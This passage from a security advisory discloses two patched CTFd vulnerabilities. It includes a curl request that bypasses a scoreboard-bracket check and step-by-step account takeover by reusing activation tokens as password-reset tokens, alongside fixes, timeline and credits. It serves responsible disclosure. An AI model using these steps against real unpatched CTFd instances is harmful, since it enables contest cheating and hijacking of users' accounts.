Some setups/deployments might\n  assume trust to this function.\n\n  The user can however *bypass the check* by:\n  1. First saving user details with bracket_id=null - GUI blocks this\n     but API allows according to line 198. E.g.\n     ┌────\n     │ curl 'http://ctfd/api/v1/users/me'; --H 'Content-Type: application/json' \\\n     │      -H 'Content-Type: application/json' -H \"CSRF-Token: $CSRF\" \\\n     │       --data-raw '{\"name\":\"test\",\"email\":\"t () t pl\",\"bracket_id\":null,\"fields\":[]}'\n     └────\n  2. Second saving again with the proper changed bracket_id - this will\n     be allowed according to line 211. This can be done normally in GUI.\n\n\n2.5 PoC example\n───────────────\n\n  Some contests can use the scoreboard bracket system to group users\n  into different prize pools. Having the possibility to change the\n  bracket might end up with cheating and getting the prize.\n\n\n2.6 Solution\n────────────\n\n  It should not be possible to change an already set bracket to null and\n  this should be verified in the API (backend) OR (if the security\n  control is simply wrong) there should be no ValidationError in order\n  not to confuse CTFd implementers.\n\n  Fixed in: <https://github.com/CTFd/CTFd/pull/2636>\n\n\n3 [Vulnerability #2] Multiple vulnerabilities in token handling\n═══════════════════════════════════════════════════════════════\n\n3.1 CVE\n───────\n\n  CVE-2024-11717\n\n\n3.2 Affected versions\n─────────────────────\n\n  CTFd (<https://ctfd.io>) versions <= 3.7.4\n\n\n3.3 CVSSv4\n──────────\n\n  6.3 Medium\n  (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N)\n\n\n3.4 Description\n───────────────\n\n3.4.1 [Vulnerability #2.1] Account activation and password reset tokens can be interchanged\n╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌\n\n  CTFd uses the \"itsdangerous\" python package for creating activation\n  and password reset tokens. In both cases it is done by signing user's\n  e-mail address with timestamp with the system's secret_key.\n\n  The generated token is directly used in URL sent to the user over\n  e-mail. During token validation, in both activation and password\n  reset, the system is checking if the HMAC signature is correct and if\n  the token was not created more than 1800s (30min) ago. Then the system\n  verifies if the signed value matches any user's e-mail address. The\n  matched user is being either activated or setting new password is\n  being permitted.\n\n  The tokens for both use cases have exactly the same construction and\n  can be used interchangeably. Particularly, activation token can be\n  used in reset password function which is pretty dangerous especially\n  when the user registers and the token was used in GET request what\n  means it can be stored in many places - browser's history, proxy\n  access logs, and so on. An attacker gaining access to such token\n  within the expiration time can use it to gain control of the victim's\n  account.\n\n  Connected with the vulnerability #3 the impact is even more visible as\n  the token can be reused many times and cannot be revoked by the user\n  until it expires.\n\n\n3.4.2 [Vulnerability #2.2] Account activation and password reset tokens are not single-use\n╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌\n\n  The described above mechanism of token generation is stateless. This\n  means tokens are not single-use and can be used withing the expiration\n  timeout (30min) multiple times.\n\n  Tokens sent in URL can be stored in many places - e-mail, browser's\n  history, proxy access logs and so on. An attacker gaining access to\n  such token within the expiration time can use it to gain control of\n  the victim's account.\n\n\n3.4.3 [Vulnerability #2.3] Email in token sent in GET requests\n╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌\n\n  The tokens for resetting password and activating account have base64\n  encoded email address of the user in plain text. They are opened via\n  GET requests which means can be stored in many places and thus may\n  leak user's email address.\n\n\n3.5 PoC example\n───────────────\n\n  High school and university students are encouraged to participate in a\n  CTF. They read this info on classes and are registering to the CTF\n  using a university/school computer (e.g. during classes).\n\n  The attack does not depend on email access:\n  1. Victim registers to CTF.\n  2. Victim logs into e-mail account and clicks the link.\n  3. Victim logs out of CTFd and e-mail account.\n  4. Attacker looks up browser history, takes the token and base64\n     decodes email address (vuln #4).\n  5. Attacker within 30 minutes takes the activation token and reuses it\n     to reset victim's password (vuln #2 and vuln #3).\n\n\n3.6 Solution\n────────────\n\n  To fix all 3 vulnerabilities it would be good to change the tokens to\n  random numbers (no email) stored in Redis cache and use keys\n  distinguishing the action type (activation vs reset password). After\n  usage the token can be removed from Redis thus making the tokens\n  single-use.\n\n  Fixed in: <https://github.com/CTFd/CTFd/pull/2679>\n\n\n4 Timeline\n══════════\n\n  • 09.10.2024 - Initial contact with vendor about encryption public key.\n  • 12.10.2024 - Reported the issue over unencrypted e-mail (vendor is\n    not offering any encryption means of vulnerability reports at the\n    moment - see issue <https://github.com/CTFd/CTFd/issues/2622>)\n  • 14.10.2024 - Fixed CVE-2024-11716 in\n    <https://github.com/CTFd/CTFd/pull/2636>\n  • 12-15.10.2024 - Discussion of the reported issues over email.\n  • 23.12.2024 - Fixed CVE-2024-11717 in\n    <https://github.com/CTFd/CTFd/pull/2679>\n\n\n5 Vendor response\n═════════════════\n\n  Special thanks to Kevin Chung (ColdHeat) from CTFd for fast response\n  and fixes.\n\n\n6 References\n════════════\n\n  • <https://sploit.tech/2024/12/24/CTFd.html> - details\n  • <https://cert.pl/en/posts/2024/12/CVE-2024-11716> - Advisory\n  • <https://github.com/CTFd/CTFd> - CTFd github repository\n\n\n7 Credits\n═════════\n\n  Author: Blazej Adamczyk (br0x) | <https://sploit.tech/>\n\n  Team: Efigo <https://efigo.pl/>\n\n",
